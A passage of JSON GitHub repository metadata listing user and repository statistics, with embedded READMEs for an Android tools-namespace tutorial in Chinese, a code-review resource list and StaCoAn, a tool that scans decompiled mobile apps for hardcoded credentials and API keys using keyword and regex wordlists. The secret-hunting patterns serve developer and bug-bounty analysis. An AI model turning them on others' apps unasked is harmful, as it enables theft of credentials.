Engineer](https://jobs.netflix.com/jobs/865783)\n","byteSize":6005},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":2016},"createdAt":"2018-02-01T00:19:19Z","updatedAt":"2018-02-17T08:35:06Z","pushedAt":"2018-02-17T01:30:53Z","description":"A lightning fast JSON:API serializer for Ruby Objects.","subscribersCount":{"totalCount":208},"diskUsage":91,"pullRequestsOpen":{"totalCount":8},"pullRequestsClosed":{"totalCount":6},"pullRequestsMerged":{"totalCount":36},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":3},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":20},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":8},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":4}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":24}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":3}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":8}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":7},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":6}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":7},"commits":{"totalCount":6}}},{"node":{"comments":{"totalCount":6},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":7},"commits":{"totalCount":12}}},{"node":{"comments":{"totalCount":4},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":10},"commits":{"totalCount":10}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":26},"issuesClosed":{"totalCount":11},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":12},"participants":{"totalCount":11}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":6}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":20},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":3},"numCommits":{"target":{"history":{"totalCount":57}}},"tags":{"totalCount":1},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"joho","followers":{"totalCount":185},"repositories":{"totalCount":66},"following":{"totalCount":90},"location":"Melbourne, Australia","organizations":{"totalCount":4},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":20}}},{"node":{"comments":{"totalCount":31},"stargazers":{"totalCount":112}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":4},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":7}}}],"totalCount":120},"websiteUrl":"http://whoisjohnbarton.com"},"repository":{"name":"awesome-code-review","primaryLanguage":null,"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":4,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":163},"createdAt":"2018-01-31T22:57:24Z","updatedAt":"2018-02-16T16:49:59Z","pushedAt":"2018-02-09T00:01:50Z","description":"An \"Awesome\" list of code review resources - articles, papers, tools, etc","subscribersCount":{"totalCount":7},"diskUsage":15,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":7}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"xiaweizi","followers":{"totalCount":35},"repositories":{"totalCount":34},"following":{"totalCount":10},"location":"Nan.jing China","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"http://xiaweizi.cn"},"repository":{"name":"AndroidToolsExample","primaryLanguage":{"name":"Java"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":20,"readme_md":{"text":"## 前言\n\n`Android`开发在所难免的就是`UI`的预览和调整，一般情况下都是直接`run`看效果，或者是使用`AS`的`preview`预览，但这同样带来个小问题，就是你的测试内容会跟随着代码被打包到`apk`中，如果没做容错的处理很有可能将测试内容展示给用户。\n\n还有就是像一些列表是不支持预览效果的，比如`ListView`。\n\n其实`Android`老早就有`tools`命名空间，作为一个开发快到一年的我，最近看到一篇文章才发现这个`tools`大用处，在此做个笔记。\n\n直接看一下效果，最为清楚：\n\n![RecyclerView.gif](http://upload-images.jianshu.io/upload_images/4043475-4b0507d661130b3d.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![ListView 预览.png](http://upload-images.jianshu.io/upload_images/4043475-d4d0aa1a853870c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n![GridView 预览.png](http://upload-images.jianshu.io/upload_images/4043475-55f190ae724d6e32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n`XML`中的代码区区几行，但是右侧的`preview`效果却很直接，还有就是这些数据并不会打到`apk`中，直接运行是没有任何效果的，这就是厉害之处！\n\n## 初步使用\n\n既然是命名空间，那肯定就要在`XML`开头就要声明。\n\n    xmlns:tools=\"http://schemas.android.com/tools\"\n\n类似于\n\n    xmlns:android=\"http://schemas.android.com/apk/res/android\"\n\n然后就可以使用`tools`的相关属性了。属性功能很多很全，我就介绍一下常用的，文尾会贴上相关的文章链接。\n\n**View 相关**\n\n先从`view`相关说起，在`XML`中`view`的`android`任意属性值，可以直接替换成`tools`，这样就可以实现实时的预览效果，并且正式部署之后不会展示。有点类似于`dataBinding`中的 `default`属性,以`TextView`为例。\n\n    //1. 原生\n    android:text=\"test text\"\n    //2. databinding\n    android:text='@{viewModel.content, default=\"test text\"}'\n    //3. tools\n    tools:text=\"test text\"\n\n`preview`的效果是一样的，不过除了 1 以外，其他运行效果是根据代码中设置的内容决定的，真正做到了测试预览。\n\n之前也说了，`view`的其他属性它都支持。\n\n**context**\n\n通过\n\n    tools:context=\"com.xiaweizi.androidtoolsexample.CommonActivity\"\n\n的方式在根部局引用，主要的作用声明该布局文件默认关联的`Activity`，引号传`Activity`类的完整包名。随之就可以开启一些与其相关的特性。比如日常点击事件中，就可以直接在`XML`中声明`onClick`的方法名，然后会有错误的`lint`提示，需要你在`Activity`中创建改方法，跟随着`AS`的智能指引，便可创建对应的方法。点击事件的处理便可以放在里面。\n\n**showIn**\n\n    tools:showIn=\"@layout/activity_other\"\n\n在使用`include`或者`merge`时，内层布局是预览不到外层的布局的。那通过`showIn`链接到外层布局，就可以直接连同外层布局一同展示出来。\n\n![showIn](http://upload-images.jianshu.io/upload_images/4043475-3e1ce6356b84a181.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n**layout**\n\n同样在`XML`中引用`fragment`布局也是预览不到效果的：\n\n![无](http://upload-images.jianshu.io/upload_images/4043475-3851aafa5a627d4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n那通过：\n\n    <fragment\n        android:id=\"@+id/fragment\"\n        android:name=\"com.xiaweizi.androidtoolsexample.CommonFragment\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\"\n        tools:layout=\"@layout/layout_fragment_test\" />\n\n的方式即可达到预览的效果。\n\n![layout.png](http://upload-images.jianshu.io/upload_images/4043475-8fcbb971d5849ce5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n## 进阶使用\n\n`tools`除去上面的功能，更强大的在于支持列表的预览展示，也就是文章开头预览的效果，效果最明显的就是`ListView`。\n\n**ListView**\n\n![ListView 预览.png](http://upload-images.jianshu.io/upload_images/4043475-d4d0aa1a853870c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n    // 1. 列表内容的布局\n    tools:listitem=\"@layout/list_content\"\n    // 2. 头布局的预览展示\n    tools:listheader=\"@layout/list_header\"\n    // 3. 脚布局的预览展示\n    tools:listfooter=\"@layout/list_footer\"\n\n> 一开始使用的时候发现不生效，后来发现需要给`ListView`设置`id`，就会立刻生效了。\n\n**GridView**\n\n![GridView 预览.png](http://upload-images.jianshu.io/upload_images/4043475-55f190ae724d6e32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n同样也适用于`GridView`。\n\n**RecyclerView**\n\n![RecyclerView.gif](http://upload-images.jianshu.io/upload_images/4043475-4b0507d661130b3d.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n说到`RecyclerView`一开始我以为只支持`itemCount`的设置，后来多谢以为小伙伴提的[AndroidToolsExample/issues/1](https://github.com/xiaweizi/AndroidToolsExample/issues/1),我才发现可以支持复杂的列表展示！\n\n    // 1. 设置展示 item 的数量\n    tools:itemCount=\"6\"\n    // 2. 设置布局方式 三种模式可以选择\n    // GridLayoutManager\n    // LinearLayoutManager\n    // StaggeredGridLayoutManager\n    tools:layoutManager=\"GridLayoutManager\"\n    // 3. item 的布局\n    tools:listitem=\"@layout/list_content\"\n    // 4 设置布局的方向\n    tools:orientation=\"horizontal\"\n    // 5. 设置布局横、纵的列数\n    tools:spanCount=\"2\"\n\n**sample**\n\n有人会好奇列表的数据哪来的，没看你设置，竟然能做到每条数据都不一样。客官别急，接下来就是介绍一下`@tools:sample/*`的强大功能，作为预览视图的占位数据。看一看官网的使用介绍。\n\n![sample](http://upload-images.jianshu.io/upload_images/4043475-e000658ceeea7530.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n各种类型的数据都支持构造，这里我以例子作为展示：\n\n![展示](http://upload-images.jianshu.io/upload_images/4043475-0088a7a62e7a0511.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n> 每次使用，都会随机的更换不同的值，详情参见列表展示数据。\n\n你以为这样就结束了吗？`too young`！除去原生给的数据支持，咱们也可以自己构造假的数据。\n\n![sample data](http://upload-images.jianshu.io/upload_images/4043475-2a20ff2392642e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n直接可以创建`sample data`，然后就可以创建文本或者`json`数据。如果是`json`数据，你必须先运行一下才能使用。那看一下如何使用。\n\n先创建`json`数据：\n\n    {\n      \"data\": [\n        {\n          \"name\": \"张三\",\n          \"phone\": \"@tools:sample/us_phones\",\n          \"time\": \"@tools:sample/date/hhmmss\",\n          \"avatar\": \"@tools:sample/avatars\"\n        },\n        {\n          \"name\": \"李四\",\n          \"phone\": \"@tools:sample/us_phones\",\n          \"time\": \"@tools:sample/date/hhmmss\",\n          \"avatar\": \"@tools:sample/avatars\"\n        },\n        {\n          \"name\": \"赵五\",\n          \"phone\": \"@tools:sample/us_phones\",\n          \"time\": \"@tools:sample/date/hhmmss\",\n          \"avatar\": \"@tools:sample/avatars\"\n        },\n        {\n          \"name\": \"王二麻\",\n          \"phone\": \"@tools:sample/us_phones\",\n          \"time\": \"@tools:sample/date/hhmmss\",\n          \"avatar\": \"@tools:sample/avatars\"\n        }\n      ]\n    }\n\n然后直接在`XML`中，通过`@sample/`的方式拿到数据。\n\n![最终预览](http://upload-images.jianshu.io/upload_images/4043475-4eadb8c507756bbe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n使用和预览正如上图所示。\n\n## 总结\n\n`get`了该技能，不说有多大用处吧，至少可以提高开发效率，和减少把测试代码部署到线上的失误率吧，相信会帮助到你的！\n\n## 感谢\n\n[tools 官方文档](https://developer.android.google.cn/studio/write/tool-attributes.html)\n\n\n[命名空间介绍](http://blog.csdn.net/p106786860/article/details/53943540)\n\n[tools 大有用处](https://www.jianshu.com/p/2912bcba4465)\n\n\n\n\n\n\n\n","byteSize":8248},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":178},"createdAt":"2018-01-31T10:05:13Z","updatedAt":"2018-02-16T08:41:52Z","pushedAt":"2018-02-09T03:39:07Z","description":"Android 中 tools 命名的使用案例","subscribersCount":{"totalCount":2},"diskUsage":161,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":16}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"vincentcox","followers":{"totalCount":15},"repositories":{"totalCount":3},"following":{"totalCount":13},"location":"Belgium","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://www.linkedin.com/in/ivincentcox/"},"repository":{"name":"StaCoAn","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":24,"readme_md":{"text":"![StaCoAn header](resources/header_stacoan-01.png)\r\n# StaCoAn ![Issues badge](https://img.shields.io/github/issues/vincentcox/StaCoAn.svg) ![License badge](https://img.shields.io/github/license/vincentcox/StaCoAn.svg) ![status](https://img.shields.io/badge/status-alpha-red.svg) ![Travis](https://api.travis-ci.org/vincentcox/StaCoAn.svg?branch=master)\r\n\r\nStaCoAn is a __crossplatform__ tool which aids developers, bugbounty hunters and ethical hackers performing [static code analysis](https://en.wikipedia.org/wiki/Static_program_analysis) on mobile applications\\*.\r\n\r\nThis tool will look for interesting lines in the code which can contain:\r\n* Hardcoded credentials\r\n* API keys\r\n* URL's of API's\r\n* Decryption keys\r\n* Major coding mistakes\r\n\r\nThis tool was created with a big focus on usability and graphical guidance in the user interface.\r\n\r\nFor the impatient ones, grab the download on the [releases page](https://github.com/vincentcox/StaCoAn/releases).\r\n\r\n<p style=\"font-size: 0.6em\">\r\n*: note that currently only apk files are supported, but ipa files will follow very shortly.\r\n</p>\r\n\r\nAn example report can be found here: [example report](resources/example-report.zip)\r\n\r\n## Features\r\nThe concept is that you drag and drop your mobile application file (an .apk or .ipa file) on the StaCoAn application and it will generate a visual and portable report for you. You can tweak the settings and wordlists to get a customized experience.\r\n\r\nThe reports contain a handy tree viewer so you can easily browse trough your decompiled application.\r\n\r\n![Mockup  application ](resources/mockup_screenshot.png)\r\n\r\n### Looting concept\r\nThe _Loot Function_ let you 'loot' (~bookmark) the findings which are of value for you and on the loot-page you will get an overview of your 'loot' raid.\r\n\r\nThe final report can be exported to a zip file and shared with other people.\r\n\r\n### Wordlists\r\nThe application uses wordlists for finding interesting lines in the code.\r\nWordlists are in the following format:\r\n```\r\nAPI_KEY|||80||| This contains an API key reference\r\n(https|http):\\/\\/.*api.*|||60||| This regex matches any URL containing 'api'\r\n```\r\n__Note that these wordlists also support [regex](https://www.regular-expressions.info/examples.html) entries.__\r\n\r\n### Filetypes\r\nAny source file will be processed. This contains '.java', '.js', '.html', '.xml',... files.\r\n\r\nDatabase-files are also searched for keywords. The database also has a table viewer.\r\n\r\n![database](resources/screenshot_database.png)\r\n\r\n### Responsive Design\r\nThe reports are made to fit on all screens.\r\n\r\n![](resources/responsive.gif)\r\n\r\n## Limitations\r\nThis tool will have trouble with [obfuscated](https://en.wikibooks.org/wiki/Introduction_to_Software_Engineering/Tools/Obfuscation) code. If you are a developer try to compile without obfuscation turned on before running this tool. If you are on the offensive side, good luck bro.\r\n\r\n## Getting Started\r\nIf you want to get started as soon as possible, head over to the [releases page](https://github.com/vincentcox/StaCoAn/releases) and download the executable or archive which corresponds to your operating system.\r\n\r\nIf you have downloaded the release zip file, extract this. Copy the .apk or .ipa file to the extracted folder.\r\n\r\nDrag and drop this file onto the executable. The report will now be generated in the `report` folder.\r\n\r\n### From source\r\n`git clone https://github.com/vincentcox/StaCoAn/`\r\n\r\n`cd StaCoAn/src`\r\n\r\nMake sure that you have pip3 installed:\r\n\r\n`sudo apt-get install python3-pip`\r\n\r\nInstall the required python packages:\r\n\r\n`pip3 install -r requirements.txt `\r\n\r\nRun StaCoAn:\r\n\r\n`python3 stacoan.py yourApp.apk`\r\n\r\n### Building the executable\r\n\r\n`pip3 install pyinstaller`\r\n\r\n__Windows__\r\n\r\n`pyinstaller main.py --onefile --icon icon.ico --name stacoan --clean`\r\n\r\n__mac__\r\n\r\n`pyinstaller main.py --onefile --icon icon.ico --name stacoan --clean`\r\n\r\n__Linux__\r\n\r\n`python3 -m PyInstaller main.py --onefile --icon icon.ico --name stacoan --clean`\r\n\r\n### Running the Docker container\r\n\r\n`cd docker`\r\n\r\n`docker build . -t stacoan`\r\n\r\n`docker run -e JAVA_OPTS=\"-Xms2048m -Xmx2048m\" -p 8000:8000 -v /yourappsfolder:/tmp -i -t stacoan /tmp/com.myapk.apk`\r\n\r\nWait for it to be analysed and the open your browser in http://localhost:8000\r\n\r\n## Contributing\r\nThis entire program's value is depending on the wordlists it is using. In the end, the final result is what matters. It is easy to build a wordlist (in comparison to writing actual code), but it has the biggest impact on the end result. You can help the community the most with making wordlists.\r\n\r\nIf you want an easy way to post your idea's, head over to: http://www.tricider.com/brainstorming/2pdrT7ONVrB. From there you can add ideas for entries in the wordlist.\r\n\r\nImproving the code is also much appreciated.\r\n\r\nIf the contribution is high enough, you will be mentioned in the `authors` section.\r\n\r\n### Roadmap\r\n- [ ] Make IPA files also work with this program\r\n- [ ] Make DB matches loot-able\r\n- [ ] Use server to upload files (apk's, ipa's) and process them (https://gist.github.com/touilleMan/eb02ea40b93e52604938)\r\n- [x] Exception list for ignoring findings in certain folders. For example ignoring `http` in `res/layout` and in general `http://schemas.android.com/apk/res/android`\r\n- [x] Make a cleaner file structure of this project\r\n\r\n## Authors & Contributors\r\n<table>\r\n  <tr>\r\n    <th><center>Project Creator</center></th>\r\n  </tr>\r\n  <tr>\r\n    <td><p align=\"center\"><img src=\"https://vincentcox.com/wp-content/uploads/IMG_3852-copy.jpg\" alt=\"Drawing\" width=\"200px\"/></p> </td>\r\n  </tr>\r\n  <tr>\r\n    <td>\r\n      <div align=\"center\">\r\n        <a href=\"https://www.linkedin.com/in/ivincentcox/\">\r\n          <img 